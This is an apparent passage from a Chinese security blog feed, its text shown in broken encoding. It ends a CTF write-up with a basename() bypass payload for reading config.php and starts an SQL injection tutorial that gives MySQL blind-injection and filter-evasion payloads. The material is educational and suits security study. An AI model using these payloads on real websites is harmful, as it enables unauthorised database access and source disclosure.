<p>æˆ‘åœ¨è‡ªå·±çš„ä¸»æœºä¸Šç¼–å†™äº†å¦‚ä¸‹ä»£ç åšæµ‹è¯•ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// test/basename.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">echo</span>(basename(<span class="variable">$file</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>æ­£å¸¸çš„url: <code>/test/basename.php/config.php?source=balabla</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424232954.png" /></p>
<p>å¦‚æœurlä¸º: <code>/test/basename.php/config.php/%81?source=balabla</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424233105.png" /></p>
<p>çŸ¥é“äº†å‰ç½®çŸ¥è¯†åå°±ç®€å•äº†ã€‚</p>
<p>é¦–å…ˆæˆ‘ä»¬è¦ç»•è¿‡æ­£åˆ™åŒ¹é…ï¼Œå…¶å®åªè¦<code>$_SERVER['PHP_SELF']</code>çš„å€¼ä¸ä»¥config.phpç»“å°¾å³å¯ï¼Œå› æ­¤åªè¦åœ¨config.phpåé¢éšä¾¿åŠ ç‚¹ä»€ä¹ˆå°±è¡Œäº†ã€‚åˆå› ä¸ºç»è¿‡basenameå‡½æ•°æœ€ç»ˆçš„ç»“æœè¦ä¸ºconfig.phpï¼Œæ‰€ä»¥æœ€ç»ˆçš„payloadä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php/config.php/%81?source</span><br></pre></td></tr></table></figure></p>
<p>å…¶å®%80ä¹Ÿå¯ä»¥ï¼Œä½†æ˜¯æœ¬åœ°æµ‹è¯•çš„æ—¶å€™æ˜¯ä¸è¡Œçš„ï¼Œä¸çŸ¥é“ä»€ä¹ˆåŸå› ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424233512.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
        <tag>PHPçŸ¥è¯†</tag>
        <tag>basenameç»•è¿‡</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLæ³¨å…¥æ€»ç»“</title>
    <url>/2022/04/28/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>ä¸ªäººå¯¹äºSQLæ³¨å…¥çš„çŸ¥è¯†ç‚¹çš„æ€»ç»“ã€‚</p>
<span id="more"></span>
<h1 id="sqlæ³¨å…¥åŸºç¡€çŸ¥è¯†">1. SQLæ³¨å…¥åŸºç¡€çŸ¥è¯†</h1>
<p>æ‰€æœ‰çš„æ¼”ç¤ºå’ŒçŸ¥è¯†ç‚¹éƒ½æ˜¯ä»¥MySQLä¸ºä¾‹ï¼Œå…¶ä»–æ•°æ®åº“ç±»ä¼¼ã€‚</p>
<h2 id="ä»€ä¹ˆæ˜¯sqlæ³¨å…¥">1.1. ä»€ä¹ˆæ˜¯SQLæ³¨å…¥ï¼Ÿ</h2>
<p>SQL(Structured Query Language)æ˜¯ä¸€é—¨ ANSI çš„æ ‡å‡†è®¡ç®—æœºè¯­è¨€ï¼Œç”¨æ¥è®¿é—®å’Œæ“ä½œæ•°æ®åº“ç³»ç»Ÿã€‚SQLè¯­å¥ç”¨äºå–å›å’Œæ›´æ–°æ•°æ®åº“ä¸­çš„æ•°æ®ã€‚</p>
<p>SQLæ³¨å…¥æŒ‡å°†<strong>æ¶æ„çš„SQLå‘½ä»¤</strong>æ’å…¥åˆ°å¼€å‘è€…è®¾ç½®çš„SQLè¯­å¥ä¸­ï¼Œè¿èƒŒäº†SQLè¯­å¥åŸæœ¬çš„æ„å›¾ï¼Œè¾¾åˆ°æ‰§è¡Œæ¶æ„SQLå‘½ä»¤çš„ç›®çš„ã€‚<strong>SQLæ³¨å…¥ä¸€èˆ¬å‘ç”Ÿåœ¨å¼€å‘è€…æ²¡æœ‰å¯¹ç”¨æˆ·çš„è¾“å…¥æ•°æ®è¿›è¡Œä¸¥æ ¼çš„é™åˆ¶/è½¬ä¹‰</strong>ï¼Œè‡´ä½¿ç”¨æˆ·åœ¨è¾“å…¥ä¸€äº›ç‰¹å®šçš„å­—ç¬¦æ—¶ï¼Œåœ¨ä¸åç«¯è®¾å®šçš„SQLè¯­å¥æ‹¼æ¥æ—¶äº§ç”Ÿäº†æ­§ä¹‰ï¼Œä½¿å¾—ç”¨æˆ·å¯ä»¥æ§åˆ¶è¯¥æ¡SQLè¯­å¥ä¸æ•°æ®åº“è¿›è¡Œé€šä¿¡ã€‚</p>
<h2 id="å¸¸è§„sqlæ³¨å…¥åˆ†ç±»">1.2. å¸¸è§„SQLæ³¨å…¥åˆ†ç±»</h2>
<ol type="1">
<li>æŒ‰ç…§å˜é‡ç±»å‹åˆ†ç±»ï¼š
<ol type="1">
<li>æ•°å­—å‹</li>
<li>å­—ç¬¦å‹</li>
</ol></li>
<li>æŒ‰SQLè¯­å¥æäº¤æ–¹å¼åˆ†ç±»ï¼š
<ol type="1">
<li>GETæ³¨å…¥</li>
<li>POSTæ³¨å…¥</li>
<li>HTTPå¤´éƒ¨æ³¨å…¥</li>
<li>Cookie/Sessionæ³¨å…¥</li>
</ol></li>
<li>æŒ‰æ³¨å…¥æ–¹å¼åˆ†ç±»ï¼š
<ol type="1">
<li>æœ‰å›æ˜¾ï¼š
<ol type="1">
<li>è”åˆæŸ¥è¯¢æ³¨å…¥</li>
<li>å †å æ³¨å…¥</li>
</ol></li>
<li>æ— å›æ˜¾ï¼š
<ol type="1">
<li>æŠ¥é”™æ³¨å…¥</li>
<li>æ—¶é—´ç›²æ³¨</li>
<li>å¸ƒå°”ç›²æ³¨</li>
</ol></li>
</ol></li>
</ol>
<h2 id="sqlå¸¸è§è¯­å¥æ ¼å¼">1.3. SQLå¸¸è§è¯­å¥æ ¼å¼</h2>
<p>SQLè¯­å¥å¸¸ç”¨çš„æœ‰å››å¤§ç±»ï¼Œä¸€èˆ¬ä¸ºå¢ã€åˆ ã€æ”¹ã€æŸ¥ã€‚<strong>å…¶ä¸­æœ€å¸¸è§çš„å°±æ˜¯æŸ¥äº†</strong>ã€‚</p>
<ol type="1">
<li>å¢ï¼š<code>insert into &lt;tableName&gt;(&lt;columnName1&gt;,&lt;columnName2&gt;,...) values(&lt;value1&gt;,&lt;value2&gt;...);</code></li>
<li>åˆ ï¼š<code>delete from &lt;tableName&gt; where &lt;codition&gt;;</code></li>
<li>æ”¹ï¼š<code>update &lt;tableName&gt; set &lt;columnName&gt;=&lt;value&gt;[,&lt;columnName&gt;=&lt;value&gt;,...] where &lt;codition&gt;;</code></li>
<li>æŸ¥ï¼š<code>select &lt;columnName&gt;[,&lt;columnName&gt;,...] from &lt;tableName&gt; where &lt;codition&gt;</code></li>
</ol>
<h2 id="æ•°æ®åº“å¿…å¤‡çŸ¥è¯†ç‚¹">1.4. æ•°æ®åº“å¿…å¤‡çŸ¥è¯†ç‚¹</h2>
<p>å¦‚æœ<strong>MySQLçš„ç‰ˆæœ¬&gt;=5.0</strong>ï¼ŒMySQLä¸­å°±ä¼šå­˜åœ¨ä¸€ä¸ªè‡ªå¸¦çš„æ•°æ®åº“åç§°ä¸º<strong>information_schema</strong>ï¼Œè¿™æ˜¯ä¸€ä¸ªè®°å½•äº†<strong>æ‰€æœ‰æ•°æ®åº“åï¼Œè¡¨åï¼Œåˆ—å</strong>çš„æ•°æ®åº“ã€‚å› æ­¤ï¼Œå¯ä»¥åˆ©ç”¨è¯¥æ•°æ®åº“è·å¾—ç‰¹å®šæ•°æ®åº“ä¸‹é¢çš„è¡¨åå’Œåˆ—åä¿¡æ¯ã€‚å…¶ä¸­ï¼š</p>
<ul>
<li>information_schema.schemata: è®°å½•äº†æ‰€æœ‰æ•°æ®åº“åä¿¡æ¯çš„è¡¨ï¼ˆä¸€èˆ¬ç”¨ä¸åˆ°ï¼‰</li>
<li>information_schema.tables: è®°å½•äº†æ‰€æœ‰è¡¨åä¿¡æ¯çš„è¡¨</li>
<li>information_schema.columns: è®°å½•äº†æ‰€æœ‰åˆ—åä¿¡æ¯çš„è¡¨</li>
</ul>
<p>å¦‚æœ<strong>MySQLçš„ç‰ˆæœ¬&lt;5.0</strong>ï¼Œé‚£ä¹ˆMySQLä¸­å°±ä¸å­˜åœ¨è¿™ä¹ˆä¸€ä¸ªæ•°æ®åº“ï¼Œè¿™ç§æƒ…å†µä¸‹åªèƒ½çŒœæµ‹ç‰¹å®šæ•°æ®åº“ä¸‹çš„è¡¨åå’Œåˆ—åç­‰ä¿¡æ¯ã€‚</p>
<p>æ•°æ®åº“ä¸­ç¬¦å·<code>.</code>è¡¨ç¤ºçš„æ˜¯ä¸‹ä¸€çº§ï¼Œå¦‚<code>information_schema.tables</code>è¡¨ç¤ºçš„å°±æ˜¯information_schemaæ•°æ®åº“ä¸‹çš„åä¸ºtablesçš„è¡¨ã€‚</p>
<p>ä»¥åŠä¸€äº›ä¼šç”¨åˆ°çš„å‡½æ•°åŠå˜é‡ï¼š</p>
<ul>
<li>table_schema, table_name, column_name: åˆ†åˆ«æ˜¯æ•°æ®åº“åã€è¡¨åã€åˆ—åã€‚ä¸¾ä¸€ä¸ªä¾‹å­ï¼š<code>select group_concat(column_name) from information_schema.columns where table_schema='databaseName' and table_name='tableName';</code></li>
</ul>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423191054.png" /></p>
<ul>
<li>user() &lt;=&gt; @<span class="citation" data-cites="user">@user</span>: æŸ¥çœ‹å½“å‰MySQLç™»å½•çš„ç”¨æˆ·å</li>
<li>database(): æŸ¥çœ‹å½“å‰ä½¿ç”¨çš„MySQLæ•°æ®åº“çš„åå­—</li>
<li>version(): æŸ¥çœ‹å½“å‰MySQLç‰ˆæœ¬</li>
<li>@<span class="citation" data-cites="version_compile_os">@version_compile_os</span>: æŸ¥çœ‹ç³»ç»Ÿ</li>
</ul>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423191151.png" /></p>
<blockquote>
<p>è¿˜æœ‰ä¸€äº›çŸ¥è¯†ç‚¹ä¼šåœ¨é‡åˆ°çš„æ—¶å€™è¡¥å……åœ¨å¯¹åº”ç« èŠ‚ã€‚</p>
</blockquote>
<h3 id="æ³¨é‡Šæ–¹å¼">1.4.1. æ³¨é‡Šæ–¹å¼</h3>
<h4 id="å¸¸è§„æ³¨é‡Š">1.4.1.1. å¸¸è§„æ³¨é‡Š</h4>
<p>å¸¸è§çš„æœ‰ä¸‰ç§æ³¨é‡Šæ–¹å¼ï¼š 1. <code>--</code>æ³¨æ„åé¢æœ‰ç©ºæ ¼ï¼›ï¼ˆä¸€èˆ¬é€šè¿‡urlä¼ å¦‚çš„æ—¶å€™éƒ½æ˜¯<code>--+</code>ï¼Œ+ä¼šè¢«å½“ä½œç©ºæ ¼ï¼Œä¹Ÿå¯ä»¥å†™%20ï¼Œè¿™æ—¶ç©ºæ ¼çš„urlç¼–ç ï¼‰ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423195759.png" /></p>
<ol start="2" type="1">
<li><p><code>#</code>ï¼›</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423195819.png" /></p></li>
<li><p><code>/*[å†…å®¹]*/</code>ï¼›</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423195842.png" /></p></li>
</ol>
<p>å…¶ä¸­å‰ä¸¤ç§ä¸ºå•è¡Œæ³¨é‡Šï¼Œç¬¬ä¸‰ç§åªå°†ä¸­é—´çš„å†…å®¹å½“ä½œæ³¨é‡Šã€‚åœ¨å›¾ç‰‡ä¸­å‰ä¸¤ç§å› ä¸ºæŠŠåé¢çš„å†…å®¹å…¨éƒ¨æ³¨é‡Šäº†ï¼ŒåŒ…æ‹¬<code>;</code>ï¼Œå› æ­¤éœ€è¦å†æ¬¡è¾“å…¥<code>;</code>æ‰å¯ä»¥ã€‚è€Œåè€…å¹¶æ²¡æœ‰æ³¨é‡Šåˆ†å·ã€‚ä¸ºäº†åšå¯¹æ¯”ï¼Œæ²¡æœ‰æ³¨é‡Šçš„æƒ…å†µå¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°åªæœ‰ä¸€è¡Œç»“æœï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423200014.png" /></p>
<h4 id="å†…è”æ³¨é‡Š">1.4.1.2. å†…è”æ³¨é‡Š</h4>
<p>MySqlä¸­ä¸ºäº†ä¿æŒå…¼å®¹ï¼Œæ¯”å¦‚ç”¨ mysqldump å¯¼å‡ºçš„SQLè¯­å¥èƒ½è¢«å…¶å®ƒæ•°æ®åº“ç›´æ¥ä½¿ç”¨ï¼Œå®ƒæŠŠä¸€äº›ç‰¹æœ‰çš„ä»…åœ¨MySQLä¸Šçš„è¯­å¥æ”¾åœ¨<code>/*!&#123;è¯­å¥&#125;*/</code>ä¸­ï¼Œè¿™æ ·è¿™äº›è¯­å¥å¦‚æœåœ¨å…¶å®ƒæ•°æ®åº“ä¸­æ˜¯ä¸ä¼šè¢«æ‰§è¡Œï¼Œä½†åœ¨MySQLä¸­å®ƒä¼šæ‰§è¡Œã€‚å› æ­¤ï¼Œè¿™å¹¶ä¸ç®—æ˜¯ä¸¥æ ¼æ„ä¹‰ä¸Šçš„æ³¨é‡Š</p>
<p>ä¾‹å­å¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423200344.png" /></p>
<h2 id="é€»è¾‘è¿ç®—">1.5. é€»è¾‘è¿ç®—</h2>
<p>å¸¸ç”¨çš„å°±æ˜¯ä¸‰ç±»ï¼šä¸ã€æˆ–ã€å¼‚æˆ–å’Œéã€‚</p>
<p>ä¸(and, &amp;&amp;)ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and 1 = 1</span><br><span class="line">1 and 0 = 0</span><br><span class="line">0 and 1 = 0</span><br><span class="line">0 and 0 = 0</span><br></pre></td></tr></table></figure></p>
<p>æˆ–(or, ||)ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 or 1 = 1</span><br><span class="line">1 or 0 = 1</span><br><span class="line">0 or 1 = 1</span><br><span class="line">0 or 0 = 0</span><br></pre></td></tr></table></figure></p>
<p>å¼‚æˆ–(^)ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 ^ 1 = 0</span><br><span class="line">1 ^ 0 = 1</span><br><span class="line">0 ^ 1 = 1</span><br><span class="line">0 ^ 0 = 0</span><br></pre></td></tr></table></figure></p>
<p>é(~)ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~0 = 1</span><br><span class="line">~1 = 0</span><br></pre></td></tr></table></figure></p>
<p>mysqlä¸­andä¼˜å…ˆçº§å¤§äºorï¼›&amp;ä¼˜å…ˆçº§å¤§äº=</p>
<p>æ³¨æ„ï¼šé€»è¾‘è¿ç®—å‰åçš„å†…å®¹åº”è¯¥æ˜¯å„è‡ªä¸ºä¸€ä½“çš„ï¼Œæ¯”å¦‚è¯´<code>condition1 and condition2</code>ï¼Œä¸èƒ½å¤Ÿå‡ºç°<code>condition1 and condtition2.1 condition2.2</code>ï¼Œå¯¹äºåè€…çš„æƒ…å†µï¼Œå¯ä»¥ä½¿ç”¨ä¸¤ä¸ªåŠæ³•ï¼š</p>
<ol type="1">
<li><code>condition1 and (condtition2.1 condition2.2)</code></li>
<li><code>condition1 and condtition2.1 and condition2.2</code></li>
</ol>
<p><strong>æ¡ä»¶è¦ä¹ˆç”¨æ‹¬å·æ‹¬èµ·æ¥ï¼Œè¦ä¹ˆå°±ä¸è¦å‡ºç°ç©ºæ ¼ï¼ï¼ï¼</strong></p>
<p>éœ€è¦æ³¨æ„ï¼Œä»¥ä¸è¿ç®—ä¸ºä¾‹ï¼Œå¦‚æœè¿ç®—å¼ä¸º<code>condition1 and condition2</code>ï¼Œå¹¶ä¸”condition1ä¸ºfalseï¼Œé‚£ä¹ˆæ­¤æ—¶æ— è®ºcondition2æ˜¯ä»€ä¹ˆéƒ½æ— æ‰€è°“äº†ï¼Œå› ä¸ºæ­¤æ—¶ç»“æœå·²ç»å®šä¸‹æ¥äº†ï¼Œé‚£å°±æ˜¯0ï¼Œæ‰€ä»¥condition2ä¸ä¼šè¢«æ‰§è¡Œã€‚</p>
<h2 id="æ‹¬å·çš„é—®é¢˜">1.6. æ‹¬å·çš„é—®é¢˜</h2>
<p>æ¯”å¦‚è¯´length(str)ï¼Œå¦‚æœå‡ºç°length(sqlè¯­å¥)ï¼Œå°±éœ€è¦æŠŠsqlè¯­å¥æ‹¬èµ·æ¥ï¼Œå½“ä½œä¸€ä¸ªæ•´ä½“ï¼Œå› ä¸ºlength(str)åªæ¥æ”¶ä¸€ä¸ªå‚æ•°ï¼Œæ‰€ä»¥æ­£ç¡®å†™æ³•ä¸ºï¼šlengt((sqlè¯­å¥))ã€‚</p>
<p>è¿™åœ¨ç©ºæ ¼è¢«è¿‡æ»¤çš„æ—¶å€™å¾ˆç»å¸¸ç”¨åˆ°ï¼Œæ¯”å¦‚å¸¸è§„çš„payloadå¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=101--+</span><br></pre></td></tr></table></figure></p>
<p>å¦‚æœæ‹¬å·è¢«è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨()ä»£æ›¿æ‹¬å·ï¼Œå°†ä¸Šè¿°payloadä¿®æ”¹ä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;or(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))=101)--+</span><br></pre></td></tr></table></figure></p>
<p>ç®€å•çš„ç†è§£ï¼šå…³é”®å­—æ˜¯ç”¨æ¥å°†ä¸€äº›æ¡ä»¶è¯­å¥ã€å˜é‡è¿æ¥èµ·æ¥çš„ï¼Œå› æ­¤ï¼Œå¯ä»¥å½“ä½œå¦‚ä¸‹æ ·å­ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select(æ¡ä»¶è¯­å¥/å˜é‡)fromm(æ¡ä»¶è¯­å¥/å˜é‡)where(æ¡ä»¶è¯­å¥/å˜é‡)and(æ¡ä»¶è¯­å¥/å˜é‡)</span><br></pre></td></tr></table></figure></p>
<h2 id="å–åˆ«å">1.7. å–åˆ«å</h2>
<h3 id="ä¸ºå­—æ®µå–åˆ«å">1.7.1. ä¸ºå­—æ®µå–åˆ«å</h3>
<p>å¯ä»¥ä¸ºæŸ¥è¯¢çš„å­—æ®µå–åˆ«åï¼Œæ­¤æ—¶aså¯ä»¥ä¸å†™ã€‚ <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id,username <span class="keyword">as</span> b,password <span class="keyword">from</span> users;</span><br><span class="line"></span><br><span class="line"><span class="keyword">or</span>:</span><br><span class="line"><span class="keyword">select</span> id,(username)b,password <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424205612.png" /></p>
<h3 id="ä¸ºè¡¨å–åˆ«å">1.7.2. ä¸ºè¡¨å–åˆ«å</h3>
<p>å¤šç”¨äºäºŒæ¬¡æŸ¥è¯¢æ—¶ï¼Œé…åˆå­—æ®µçš„åˆ«åä¸€èµ·ä½¿ç”¨ï¼ˆæ­¤æ—¶å¿…é¡»ä¸ºè¡¨å–åˆ«åï¼Œå¦åˆ™ç›´æ¥æŠ¥é”™ï¼‰ <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">3</span>` <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> users)<span class="keyword">as</span> alia; # æ­¤æ—¶<span class="keyword">as</span>ä¹Ÿå¯ä»¥ä¸å†™ï¼Œæ³¨æ„æœ€å‰é¢çš„<span class="number">3</span>æ˜¯è¢«åå¼•å·åŒ…å›´</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424205834.png" /></p>
<p>è§£é‡Šï¼šé¦–å…ˆæ‰§è¡Œ<code>(select 1,2,3,4 from users)as alia</code>ï¼Œå¾—åˆ°åˆ—ååˆ†åˆ«ä¸º1ï¼Œ2ï¼Œ3ï¼Œ4çš„ä¸€å¼ è¡¨ï¼Œå¹¶ä¸”å–äº†ä¸€ä¸ªåˆ«åaliaã€‚ç„¶åæ‰§è¡Œ <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">3</span>` <span class="keyword">from</span> alia; # åå¼•å·æ˜¯å¿…é¡»çš„ï¼Œå¦åˆ™æŠ¥é”™</span><br></pre></td></tr></table></figure></p>
<p>ä»aliaä¸­å–å‡ºåˆ—åä¸º3çš„ä¿¡æ¯ã€‚</p>
<p>ä¹Ÿå¯ä»¥ä¸ºåˆ—åå†å–åˆ«åï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> b <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">as</span> b,<span class="number">4</span> <span class="keyword">from</span> users)<span class="keyword">as</span> alia;</span><br></pre></td></tr></table></figure></p>
<p>å¤šç”¨äºåå¼•å·è¢«è¿‡æ»¤ã€‚</p>
<h2 id="ä¸€æ¬¡æ‰§è¡Œå¤šæ¡sqlè¯­å¥">1.8. ä¸€æ¬¡æ‰§è¡Œå¤šæ¡sqlè¯­å¥</h2>
<p>å¸¸è§„çš„sqlè¯­å¥ä¸ºï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure></p>
<p>å¯ä»¥é€šè¿‡union selectè¿æ¥ä¸¤ä¸ªæˆ–å¤šä¸ªæŸ¥è¯¢è¯­å¥ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> users <span class="keyword">union</span> <span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">union</span> <span class="keyword">select</span> password <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424215405.png" /></p>
<p>å¯ä»¥ç›´æ¥è¾“å…¥å¤šæ¡sqlè¯­å¥ï¼Œè¯­å¥ä¹‹é—´ç”¨;åˆ†éš”ï¼Œè¿™æ ·å­æ•°æ®åº“å°±ä¼šæŒ‰ç€é¡ºåºä¸€æ¡ä¸€æ¡æ‰§è¡Œï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> users; <span class="keyword">select</span> username <span class="keyword">from</span> users; <span class="keyword">select</span> password <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424215447.png" /></p>
<h2 id="é¢„ç¼–è¯‘">1.9. é¢„ç¼–è¯‘</h2>
<p>æœ‰äº›æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦å¤šæ¬¡æŸ¥è¯¢ï¼Œä½†æ˜¯æ¯æ¬¡æŸ¥è¯¢æœ‰å¯èƒ½åªæ˜¯whereåé¢çš„æ¡ä»¶ä¸ä¸€æ ·ï¼Œä½†æ˜¯æ¯æ¬¡æˆ‘ä»¬éƒ½éœ€è¦è¾“å…¥å®Œæ•´çš„æŸ¥è¯¢è¯­å¥ï¼Œéå¸¸æµªè´¹æ—¶é—´ï¼Œå› æ­¤æ‰æœ‰äº†é¢„ç¼–è¯‘ã€‚ä»¥æŸ¥è¯¢ä¸ºä¾‹ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span>?;</span><br></pre></td></tr></table></figure></p>
<p>å°†idåé¢çš„å€¼ç”¨å ä½ç¬¦å æ³¨ï¼Œå¹¶ç»™è¿™å¥è¯èµ·ä¸€ä¸ªåˆ«åï¼Œé‚£ä¹ˆä¸‹æ¬¡ä½¿ç”¨çš„æ—¶å€™åªéœ€è¦è¾“å…¥åˆ«åä»¥åŠå˜é‡å³å¯ã€‚</p>
<p>è¯­æ³•ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># å®šä¹‰é¢„å¤„ç†è¯­å¥</span><br><span class="line"><span class="keyword">PREPARE</span> stmt_name <span class="keyword">FROM</span> preparable_stmt;</span><br><span class="line"></span><br><span class="line"># æ‰§è¡Œé¢„å¤„ç†è¯­å¥</span><br><span class="line"><span class="keyword">EXECUTE</span> stmt_name [<span class="keyword">USING</span> <span class="variable">@var</span>_name [, <span class="variable">@var</span>_name] ...];</span><br><span class="line"></span><br><span class="line"># åˆ é™¤(é‡Šæ”¾)å®šä¹‰</span><br><span class="line">&#123;<span class="keyword">DEALLOCATE</span> <span class="operator">|</span> <span class="keyword">DROP</span>&#125; <span class="keyword">PREPARE</span> stmt_name;</span><br></pre></td></tr></table></figure></p>
<p>ä¸¾ä¸ªä¾‹å­ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">prepare</span> stmt1 <span class="keyword">from</span> <span class="string">&#x27;select * from users where id=?&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span><span class="number">3</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">execute</span> stmt1 <span class="keyword">using</span> <span class="variable">@a</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span> camp   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> hdf      <span class="operator">|</span> hdf      <span class="operator">|</span> common <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
<p>è¿˜å¯ä»¥ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">set</span> <span class="variable">@s</span><span class="operator">=</span><span class="string">&#x27;select * from users where id=?&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">prepare</span> stmt2 <span class="keyword">from</span> <span class="variable">@s</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">set</span> <span class="variable">@b</span><span class="operator">=</span><span class="number">4</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">execute</span> stmt2 <span class="keyword">using</span> <span class="variable">@b</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span> camp   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">4</span> <span class="operator">|</span> xioazz   <span class="operator">|</span> xiozz    <span class="operator">|</span> common <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
